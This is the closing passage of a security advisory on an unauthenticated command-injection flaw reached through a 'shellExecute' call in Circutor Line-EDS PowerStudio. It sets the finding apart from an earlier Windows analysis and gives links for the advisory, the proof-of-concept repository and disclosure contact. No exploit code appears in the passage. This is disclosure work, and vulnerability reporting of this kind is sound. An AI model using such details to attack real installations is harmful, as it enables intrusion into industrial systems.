at `0x180006f90`, a 64-bit address — and which places the .NET components in the
surrounding ASP.NET Core microservices rather than in the engine carrying `shellExecute`. The
table above corrects the record against that published sibling analysis. Being a different
binary, on a different platform, with a different sink API and a different authorization
weakness, this is an independent finding. This advisory makes no claim about the Windows
platform, in either direction: it is neither asserted to be affected by the defect
described here nor re-assessed by it, and any fix applied to one platform should be
assumed to leave the other unchanged until it is separately verified.

No identifier has been assigned to this vulnerability at the time of writing. This advisory
will be published at
https://0day-rubbish.com/blog/circutor-lineeds-pwrstudio-shellexecute-unauth-command-injection,
with the proof of concept and this analysis mirrored at
https://github.com/Exploit-Garbage/0day-Rubbish. Technical correspondence about this finding
is handled at disclosure@0day-rubbish.com.

---

Advisory: https://0day-rubbish.com/blog/circutor-lineeds-pwrstudio-shellexecute-unauth-command-injection
Repository: https://github.com/Exploit-Garbage/0day-Rubbish
Contact: disclosure@0day-rubbish.com
